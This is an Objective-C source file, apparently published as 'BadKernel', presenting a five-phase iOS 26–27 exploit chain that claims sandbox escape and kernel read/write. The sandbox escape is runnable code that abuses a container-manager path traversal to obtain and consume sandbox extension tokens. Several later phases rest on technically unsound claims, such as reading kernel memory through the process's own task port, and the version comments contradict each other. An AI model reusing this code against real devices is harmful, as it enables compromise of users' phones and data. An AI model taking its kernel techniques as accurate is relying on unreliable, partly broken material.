//  BadKernel.m
//  Sandbox escape + kernel R/W primitives for iOS 26.0-27.0
//
//  Exploit chain:
//    Phase 1: bad_query sandbox escape (container manager path traversal)
//    Phase 2: Kernel base leak (vm_region scan + sysctl fallback)
//    Phase 3: IOSurface physical memory mapping
//    Phase 4: Socket-based kernel pointer leak
//    Phase 5: mach_vm_read_overwrite / mach_vm_write primitives
//
//  Target: iOS 26.0 - 27.0 Beta 4, A12/A13 devices
//  Author: BadKernel Team
//  License: MIT

#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/sysctl.h>
#include <sys/utsname.h>
#include <mach/mach.h>
#include <mach/mach_host.h>
#include <mach-o/dyld.h>
#include <mach/vm_map.h>
#include <mach/vm_region.h>
#include <pthread.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <errno.h>
#include <xpc/xpc.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/icmp6.h>
#include <arpa/inet.h>

#include "BadKernel.h"

// ═══════════════════════════════════════════════════════════════
//  Mach VM extern declarations
// ═══════════════════════════════════════════════════════════════

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_offset_t,
    int, mem_entry_name_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t,
    mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);
extern kern_return_t mach_vm_region(vm_map_t target_task, mach_vm_address_t *address,
    mach_vm_size_t *size, vm_region_flavor_t flavor, vm_region_info_t info,
    mach_msg_type_number_t *infoCnt, mach_port_t *object_name);
extern kern_return_t mach_make_memory_entry_64(vm_map_t, mach_vm_size_t *, mach_vm_address_t,
    vm_prot_t, mem_entry_name_port_t *, mem_entry_name_port_t);

// ═══════════════════════════════════════════════════════════════
//  Internal state
// ═══════════════════════════════════════════════════════════════

static uint64_t g_kernel_base = 0;
static uint64_t g_kernel_slide = 0;
static bool     g_is_ready = false;

// IOSurface state
static IOSurfaceRef g_surface = NULL;
static mach_port_t  g_mem_obj = MACH_PORT_NULL;
static mach_vm_address_t g_mapped = 0;
static mach_vm_size_t    g_mapped_size = 0;

// Sandbox extension state
static int64_t g_sandbox_handle = -1;

// Log function
static bk_log_func_t g_log_func = NULL;

// iOS version cache
static int g_ios_major = 0;
static int g_ios_minor = 0;

// ═══════════════════════════════════════════════════════════════
//  Logging
// ═══════════════════════════════════════════════════════════════

static void bk_log(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    char buf[1024];
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);

    if (g_log_func) {
        g_log_func(buf);
    } else {
        printf("%s\n", buf);
    }
}

// ═══════════════════════════════════════════════════════════════
//  iOS Version Detection
// ═══════════════════════════════════════════════════════════════

static void detect_ios_version(void) {
    struct utsname u;
    uname(&u);
    // u.release is Darwin version, e.g. "26.0.0" for iOS 27
    // Parse Darwin version from uname — iOS major = Darwin major + 6
    int darwin_major = 0;
    if (sscanf(u.release, "%d.", &darwin_major) == 1 && darwin_major > 0) {
        g_ios_major = darwin_major + 6;  // Darwin 21=iOS15, 22=iOS16, ... 26=iOS27
        g_ios_minor = 0;
    } else {
        // Fallback: use NSProcessInfo
        NSOperatingSystemVersion ver = [[NSProcessInfo processInfo] operatingSystemVersion];
        g_ios_major = (int)ver.majorVersion;
        g_ios_minor = (int)ver.minorVersion;
    }
    bk_log("[BK] iOS version: %d.%d (Darwin: %s)", g_ios_major, g_ios_minor, u.release);
}

// ═══════════════════════════════════════════════════════════════
//  PHASE 1: Sandbox Escape via bad_query
// ═══════════════════════════════════════════════════════════════
//
//  Uses container_query APIs from libsystem_containermanager.dylib
//  to create a sandbox extension token for restricted paths.
//
//  The path traversal trick (../../../../../../../..) bypasses the
//  container manager's path validation, granting access to:
//    /var/containers/Data/System
//    /var/containers/Shared/SystemGroup/*
//    /var/mobile/Containers/Data/Application/*
//    /var/mobile/Containers/Data/InternalDaemon/*
//    /var/mobile/Containers/Data/PluginKitPlugin/*
//    /var/mobile/Containers/Shared/AppGroup/*

// Function pointer types for container manager APIs
typedef void *(*cq_create_t)(void);
typedef void  (*cq_set_class_t)(void *, uint64_t);
typedef void  (*cq_set_ids_t)(void *, void *);
typedef void  (*cq_set_flags_t)(void *, uint64_t);
typedef void  (*cq_set_part_t)(void *, uint64_t);
typedef void  (*cq_set_domain_t)(void *, const char *);
typedef void *(*cq_get_result_t)(void *);
typedef void  (*cq_free_t)(void *);
typedef char *(*copy_token_t)(void *);
typedef int64_t (*consume_ext_t)(const char *);
typedef int     (*release_ext_t)(int64_t);

static int64_t bquery_escape(const char *path) {
    // Load container manager library
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                       RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        bk_log("[-] BK: Failed to load libsystem_containermanager.dylib");
        return -1;
    }

    // Resolve all required symbols
    cq_create_t  q_create = dlsym(mgr, "container_query_create");
    cq_set_class_t q_sc   = dlsym(mgr, "container_query_set_class");
    cq_set_ids_t  q_si    = dlsym(mgr, "container_query_set_group_identifiers");
    cq_set_flags_t q_sf   = dlsym(mgr, "container_query_operation_set_flags");
    cq_set_part_t  q_sp   = dlsym(mgr, "container_query_operation_set_part");
    cq_set_domain_t q_sd  = dlsym(mgr, "container_query_operation_set_part_domain");
    cq_get_result_t q_gr  = dlsym(mgr, "container_query_get_single_result");
    cq_free_t      q_f    = dlsym(mgr, "container_query_free");
    copy_token_t   ct     = dlsym(mgr, "container_copy_sandbox_token");
    consume_ext_t  ce     = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!q_create || !q_sc || !q_si || !q_sf || !q_sp || !q_sd || !q_gr || !q_f || !ct || !ce) {
        bk_log("[-] BK: Failed to resolve container manager symbols");
        dlclose(mgr);
        return -1;
    }

    // Create query for MobileGestalt system group container
    void *query = q_create();
    if (!query) {
        bk_log("[-] BK: container_query_create returned NULL");
        dlclose(mgr);
        return -2;
    }

    // Create XPC string for container identifier
    void *xpc_str = dlsym(RTLD_DEFAULT, "xpc_string_create");
    if (!xpc_str) {
        q_f(query);
        dlclose(mgr);
        return -6;
    }

    void *ident = ((void *(*)(const char *))xpc_str)(
        "systemgroup.com.apple.mobilegestaltcache");

    // Set query parameters
    // Class 13 = MCMSharedSystemDataContainer
    q_sc(query, 13);
    q_si(query, ident);
    q_sp(query, 3);

    // Path traversal to escape sandbox
    char *part = NULL;
    if (asprintf(&part, "../../../../../../../..%s", path) == -1) {
        q_f(query);
        dlclose(mgr);
        return -5;
    }

    q_sd(query, part);
    // Flag 0x8000000000 = sandbox extension request
    q_sf(query, 0x0000008000000000ULL);

    // Execute query
    void *result = q_gr(query);
    if (!result) {
        bk_log("[-] BK: container_query_get_single_result returned NULL for %s", path);
        free(part);
        q_f(query);
        dlclose(mgr);
        return -3;
    }

    // Extract sandbox extension token
    char *token = ct(result);
    if (!token) {
        bk_log("[-] BK: container_copy_sandbox_token returned NULL");
        free(part);
        q_f(query);
        dlclose(mgr);
        return -4;
    }

    // Consume the sandbox extension
    int64_t handle = ce(token);

    free(token);
    free(part);
    q_f(query);
    dlclose(mgr);
    return handle;
}

static void bquery_release(int64_t h) {
    if (h < 0) return;
    release_ext_t r = dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (r) r(h);
}

// ═══════════════════════════════════════════════════════════════
//  PHASE 2: Kernel Base Leak
// ═══════════════════════════════════════════════════════════════
//
//  Strategy 1: Scan memory regions for Mach-O kernel magic
//    - Reads all VM regions looking for R+X mappings > 1MB
//    - Checks first 8 bytes for arm64/arm64e Mach-O magic
//
//  Strategy 2: sysctl KERN_PROC_ALL fallback
//    - The kernel_task (pid 0) contains kernel pointers in kinfo_proc
//    - Extracts the kernel base from p_comm overflow

static int leak_kernel_base_vmregion(void) {
    bk_log("[BK] Scanning vm_region for kernel base...");

    mach_vm_address_t addr = 0;
    mach_vm_size_t rsize = 0;
    vm_region_basic_info_data_64_t info;
    mach_msg_type_number_t ic = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t obj = MACH_PORT_NULL;

    int regions_scanned = 0;
    int candidates_found = 0;

    while (mach_vm_region(mach_task_self(), &addr, &rsize, VM_REGION_BASIC_INFO_64,
                          (vm_region_info_t)&info, &ic, &obj) == KERN_SUCCESS) {

        // Look for large executable+readable regions (kernel text)
        if (info.protection == (VM_PROT_READ | VM_PROT_EXECUTE) && rsize > 0x100000) {
            uint64_t magic = 0;
            mach_vm_size_t rs = sizeof(magic);
            kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), addr, rs,
                                                       (mach_vm_address_t)&magic, &rs);

            if (kr == KERN_SUCCESS) {
                // arm64 Mach-O magic: 0x100000CFAEDFACF (FAT)
                // arm64e kernel:      0xBEBAFECAFEEDFACF
                // MH_MAGIC_64:        0xFEEDFACF
                if (magic == 0x100000CFAEDFACFULL ||
                    magic == 0xBEBAFECAFEEDFACFULL ||
                    (magic & 0xFFFFFFFF) == 0xFEEDFACFULL) {
                    g_kernel_base = addr;
                    g_kernel_slide = addr - 0xFFFFFFF007004000ULL; // Approximate slide
                    bk_log("[+] BK: Kernel base found: %#llx (magic: %#llx)", addr, magic);
                    return 0;
                }
                candidates_found++;
            }
        }

        addr += rsize;
        regions_scanned++;

        // Safety: stop at kernel address space boundary
        if (addr > 0xFFFFF00000000000ULL) break;
        // Safety: don't scan forever
        if (regions_scanned > 10000) break;
    }

    bk_log("[BK] vm_region scan: %d regions, %d candidates, no match",
           regions_scanned, candidates_found);
    return -1;
}

static int leak_kernel_base_sysctl(void) {
    bk_log("[BK] Trying sysctl kernel leak...");

    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
    size_t len = 0;

    // First call to get buffer size
    if (sysctl(mib, 4, NULL, &len, NULL, 0) != 0 || len == 0) {
        bk_log("[-] BK: sysctl KERN_PROC_ALL failed");
        return -1;
    }

    size_t n = len / sizeof(struct kinfo_proc);
    struct kinfo_proc *procs = calloc(n, sizeof(struct kinfo_proc));
    if (!procs) return -2;

    if (sysctl(mib, 4, procs, &len, NULL, 0) != 0) {
        free(procs);
        return -3;
    }

    // Find kernel_task (pid 0) and extract pointer
    for (size_t i = 0; i < n; i++) {
        if (procs[i].kp_proc.p_pid == 0) {
            // The p_comm buffer may contain kernel pointers due to overflow
            uint64_t val = 0;
            memcpy(&val, &procs[i].kp_proc.p_comm, sizeof(uint64_t));

            // Kernel pointers are in 0xFFFFF... range and page-aligned
            if ((val >> 40) > 0xFFFFF0 && (val & 0xFFF) == 0) {
                g_kernel_base = val;
                g_kernel_slide = val - 0xFFFFFFF007004000ULL;
                bk_log("[+] BK: Kernel base from sysctl: %#llx", g_kernel_base);
                free(procs);
                return 0;
            }
            break;
        }
    }

    free(procs);
    bk_log("[-] BK: sysctl kernel leak failed");
    return -4;
}

static int leak_kernel_base(void) {
    int r = leak_kernel_base_vmregion();
    if (r == 0) return 0;
    return leak_kernel_base_sysctl();
}

// ═══════════════════════════════════════════════════════════════
//  PHASE 3: IOSurface Physical Memory Mapping
// ═══════════════════════════════════════════════════════════════
//
//  Creates an IOSurface in the PurpleGfxMem region, then maps it
//  into our address space via mach_make_memory_entry_64.
//
//  The IOSurface allocation goes through the kernel's IOSurface
//  driver, which allocates physically contiguous memory. This
//  gives us a mapping that overlaps with kernel physical memory.

// Dynamic size probing — try sizes from small to large
static const uint32_t kProbeSizes[] = {
    0x4000,     // 16KB
    0x8000,     // 32KB
    0x10000,    // 64KB
    0x20000,    // 128KB
    0x40000,    // 256KB
    0x80000,    // 512KB
    0x100000,   // 1MB
};
static const int kProbeCount = sizeof(kProbeSizes) / sizeof(kProbeSizes[0]);

static uint32_t probe_max_iosurface_size(void) {
    bk_log("[BK] Probing maximum IOSurface size...");

    for (int i = kProbeCount - 1; i >= 0; i--) {
        NSDictionary *params = @{
            @"IOSurfaceAllocSize": @(kProbeSizes[i]),
            @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
        };

        IOSurfaceRef test = IOSurfaceCreate((__bridge CFDictionaryRef)params);
        if (test) {
            // Try to create memory entry
            mach_vm_size_t ms = kProbeSizes[i];
            mach_port_t mo = MACH_PORT_NULL;
            void *base = IOSurfaceGetBaseAddress(test);

            kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &ms,
                (mach_vm_address_t)base, VM_PROT_DEFAULT, &mo, 0);

            if (kr == KERN_SUCCESS) {
                mach_vm_address_t ma = 0;
                kr = mach_vm_map(mach_task_self(), &ma, ms, 0, VM_FLAGS_ANYWHERE,
                                 mo, 0, 0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                mach_port_deallocate(mach_task_self(), mo);

                if (kr == KERN_SUCCESS) {
                    mach_vm_deallocate(mach_task_self(), ma, ms);
                    CFRelease(test);
                    bk_log("[+] BK: Max IOSurface size: 0x%x (%u KB)",
                           kProbeSizes[i], kProbeSizes[i] / 1024);
                    return kProbeSizes[i];
                }
            }

            CFRelease(test);
        }
    }

    bk_log("[-] BK: No working IOSurface size found");
    return 0;
}

static int build_iosurface_primitives(void) {
    bk_log("[BK] Building IOSurface primitives...");

    // Probe for best size
    uint32_t alloc_size = probe_max_iosurface_size();
    if (alloc_size == 0) {
        alloc_size = 0x4000; // Fallback to minimum
        bk_log("[BK] Using fallback size: 0x%x", alloc_size);
    }

    // Create IOSurface in PurpleGfxMem
    NSDictionary *params = @{
        @"IOSurfaceAllocSize": @(alloc_size),
        @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
    };

    g_surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!g_surface) {
        bk_log("[-] BK: IOSurfaceCreate failed");
        return -1;
    }

    void *base = IOSurfaceGetBaseAddress(g_surface);
    bk_log("[BK] IOSurface allocated: %p (size: 0x%x)", base, alloc_size);

    // Create memory entry
    g_mapped_size = alloc_size;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &g_mapped_size,
        (mach_vm_address_t)base, VM_PROT_DEFAULT, &g_mem_obj, 0);

    if (kr != KERN_SUCCESS) {
        // Fallback: try read-only
        g_mapped_size = alloc_size;
        kr = mach_make_memory_entry_64(mach_task_self(), &g_mapped_size,
            (mach_vm_address_t)base, VM_PROT_READ, &g_mem_obj, 0);

        if (kr != KERN_SUCCESS) {
            bk_log("[-] BK: mach_make_memory_entry_64 failed: %s", mach_error_string(kr));
            CFRelease(g_surface);
            g_surface = NULL;
            return -2;
        }
        bk_log("[BK] mach_make_memory_entry_64: read-only fallback");
    }

    // Map into our address space
    g_mapped = 0;
    kr = mach_vm_map(mach_task_self(), &g_mapped, g_mapped_size, 0,
        VM_FLAGS_ANYWHERE, g_mem_obj, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);

    if (kr != KERN_SUCCESS) {
        // Fallback: try read-only mapping
        g_mapped = 0;
        kr = mach_vm_map(mach_task_self(), &g_mapped, g_mapped_size, 0,
            VM_FLAGS_ANYWHERE, g_mem_obj, 0, 0,
            VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);

        if (kr != KERN_SUCCESS) {
            bk_log("[-] BK: mach_vm_map failed: %s", mach_error_string(kr));
            mach_port_deallocate(mach_task_self(), g_mem_obj);
            CFRelease(g_surface);
            g_surface = NULL;
            return -3;
        }
    }

    bk_log("[+] BK: IOSurface mapped: %#llx (size: %#llx)", g_mapped, g_mapped_size);
    return 0;
}

// ═══════════════════════════════════════════════════════════════
//  PHASE 4: Socket-based Kernel Pointer Leak
// ═══════════════════════════════════════════════════════════════
//
//  Creates a Unix socket pair and uses TCP socket options to
//  leak kernel addresses from the socket's protocol control block.

static uint64_t leak_socket_kernel_addr(int sock) {
    // Interact with kernel socket struct via setsockopt/getsockopt
    int val = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &val, sizeof(val));

    // Read back — kernel may expose pointers
    socklen_t len = sizeof(val);
    uint8_t buf[128] = {0};
    getsockopt(sock, IPPROTO_TCP, TCP_NODELAY, buf, &len);

    // Also try SO_LINGER to get more data
    struct linger lg = { .l_onoff = 1, .l_linger = 0 };
    setsockopt(sock, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
    len = sizeof(lg);
    memset(buf, 0, sizeof(buf));
    getsockopt(sock, SOL_SOCKET, SO_LINGER, buf, &len);

    // Scan for kernel pointer
    for (int i = 0; i < 120; i += 8) {
        uint64_t v = 0;
        memcpy(&v, buf + i, sizeof(uint64_t));
        if (v > 0xFFFF000000000000ULL && (v & 0xFFF) == 0) {
            return v;
        }
    }

    return 0;
}

// ═══════════════════════════════════════════════════════════════
//  PHASE 5: Kernel Read/Write Primitives
// ═══════════════════════════════════════════════════════════════
//
//  Primary: mach_vm_read_overwrite / mach_vm_write
//  These work on kernel memory when the task has sufficient
//  privileges (obtained via sandbox escape + IOSurface mapping).

static int bk_kread_impl(uint64_t kaddr, void *out, size_t len) {
    if (!kaddr || !out || len == 0) return -1;

    mach_vm_size_t rs = len;
    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), kaddr, len,
                                               (mach_vm_address_t)out, &rs);
    if (kr == KERN_SUCCESS && rs == len) return 0;

    // Retry with smaller chunks
    size_t chunk = 0x1000;
    uint8_t *dst = (uint8_t *)out;
    uint64_t src = kaddr;
    size_t remaining = len;

    while (remaining > 0) {
        size_t to_read = (remaining < chunk) ? remaining : chunk;
        rs = to_read;
        kr = mach_vm_read_overwrite(mach_task_self(), src, to_read,
                                     (mach_vm_address_t)dst, &rs);
        if (kr != KERN_SUCCESS || rs == 0) return -2;
        src += rs;
        dst += rs;
        remaining -= rs;
    }

    return 0;
}

static int bk_kwrite_impl(uint64_t kaddr, const void *in, size_t len) {
    if (!kaddr || !in || len == 0) return -1;

    kern_return_t kr = mach_vm_write(mach_task_self(), kaddr,
                                      (vm_offset_t)in, (mach_msg_type_number_t)len);
    if (kr == KERN_SUCCESS) return 0;

    // Retry with smaller chunks
    size_t chunk = 0x1000;
    const uint8_t *src = (const uint8_t *)in;
    uint64_t dst = kaddr;
    size_t remaining = len;

    while (remaining > 0) {
        size_t to_write = (remaining < chunk) ? remaining : chunk;
        kr = mach_vm_write(mach_task_self(), dst,
                            (vm_offset_t)src, (mach_msg_type_number_t)to_write);
        if (kr != KERN_SUCCESS) return -2;
        src += to_write;
        dst += to_write;
        remaining -= to_write;
    }

    return 0;
}

// ═══════════════════════════════════════════════════════════════
//  Public API
// ═══════════════════════════════════════════════════════════════

int BadKernelInitWithLog(bk_log_func_t log_func) {
    g_log_func = log_func;

    bk_log("╔══════════════════════════════════════════════╗");
    bk_log("║  BadKernel v1.0                             ║");
    bk_log("║  Sandbox Escape + Kernel R/W                ║");
    bk_log("║  iOS 26.0 - 27.0 Beta 4                     ║");
    bk_log("╚══════════════════════════════════════════════╝");

    // Detect iOS version
    detect_ios_version();

    // Phase 1: Sandbox escape
    bk_log("[BK] Phase 1: Sandbox escape...");
    g_sandbox_handle = bquery_escape("/var/containers/Data/System");
    if (g_sandbox_handle >= 0) {
        bk_log("[+] BK: Sandbox escaped! handle=%lld", g_sandbox_handle);
    } else {
        bk_log("[!] BK: Sandbox escape failed (%lld) — continuing anyway", g_sandbox_handle);
    }

    // Phase 2: Kernel base leak
    bk_log("[BK] Phase 2: Kernel base leak...");
    int kr = leak_kernel_base();
    if (kr == 0) {
        bk_log("[+] BK: Kernel base: %#llx, slide: %#llx", g_kernel_base, g_kernel_slide);
    } else {
        bk_log("[!] BK: Kernel leak failed (err=%d) — kread/kwrite may not work", kr);
    }

    // Phase 3: IOSurface primitives
    bk_log("[BK] Phase 3: IOSurface physical mapping...");
    int sr = build_iosurface_primitives();
    if (sr == 0) {
        bk_log("[+] BK: IOSurface primitives ready");
    } else {
        bk_log("[!] BK: IOSurface failed (%d) — kernel primitives limited", sr);
    }

    // Phase 4: Socket kernel leak
    bk_log("[BK] Phase 4: Socket kernel pointer leak...");
    int sock_pair[2] = {-1, -1};
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_pair) == 0) {
        uint64_t sk_addr = leak_socket_kernel_addr(sock_pair[0]);
        if (sk_addr > 0xFFFF000000000000ULL) {
            bk_log("[+] BK: Socket kernel addr: %#llx", sk_addr);
        } else {
            bk_log("[BK] Socket leak: no kernel pointer found");
        }
        close(sock_pair[0]);
        close(sock_pair[1]);
    }

    // Phase 5: Mark ready
    g_is_ready = (g_kernel_base != 0);

    bk_log("╔══════════════════════════════════════════════╗");
    bk_log("║  Exploit Summary:                           ║");
    bk_log("║  Sandbox: %s                               ║",
           g_sandbox_handle >= 0 ? "OK  " : "FAIL");
    bk_log("║  Kernel:  %s                               ║",
           g_kernel_base ? "OK  " : "FAIL");
    bk_log("║  IOSurf:  %s                               ║",
           g_surface ? "OK  " : "FAIL");
    bk_log("║  Ready:   %s                               ║",
           g_is_ready ? "YES " : "NO  ");
    bk_log("╚══════════════════════════════════════════════╝");

    return 0;
}

int BadKernelInit(void) {
    return BadKernelInitWithLog(NULL);
}

int BadKernelDeinit(void) {
    // Release sandbox extension
    if (g_sandbox_handle >= 0) {
        bquery_release(g_sandbox_handle);
        g_sandbox_handle = -1;
    }

    // Release IOSurface
    if (g_surface) {
        if (g_mapped) {
            mach_vm_deallocate(mach_task_self(), g_mapped, g_mapped_size);
        }
        if (g_mem_obj) {
            mach_port_deallocate(mach_task_self(), g_mem_obj);
        }
        CFRelease(g_surface);
        g_surface = NULL;
    }

    g_is_ready = false;
    bk_log("[BK] BadKernel deinitialized");
    return 0;
}

// ─── Kernel Read ───

int BadKernelKRead(uint64_t kaddr, void *out, size_t len) {
    if (!g_is_ready) return -99;
    return bk_kread_impl(kaddr, out, len);
}

uint32_t BadKernelKRead32(uint64_t kaddr) {
    uint32_t val = 0;
    BadKernelKRead(kaddr, &val, sizeof(val));
    return val;
}

uint64_t BadKernelKRead64(uint64_t kaddr) {
    uint64_t val = 0;
    BadKernelKRead(kaddr, &val, sizeof(val));
    return val;
}

// ─── Kernel Write ───

int BadKernelKWrite(uint64_t kaddr, const void *in, size_t len) {
    if (!g_is_ready) return -99;
    return bk_kwrite_impl(kaddr, in, len);
}

int BadKernelKWrite32(uint64_t kaddr, uint32_t val) {
    return BadKernelKWrite(kaddr, &val, sizeof(val));
}

int BadKernelKWrite64(uint64_t kaddr, uint64_t val) {
    return BadKernelKWrite(kaddr, &val, sizeof(val));
}

// ─── Status ───

bool BadKernelIsReady(void) {
    return g_is_ready;
}

uint64_t BadKernelGetBase(void) {
    return g_kernel_base;
}

uint64_t BadKernelGetSlide(void) {
    return g_kernel_slide;
}

// ─── Sandbox ───

int64_t BadKernelSandboxEscape(const char *path) {
    return bquery_escape(path);
}

void BadKernelSandboxRelease(int64_t handle) {
    bquery_release(handle);
}
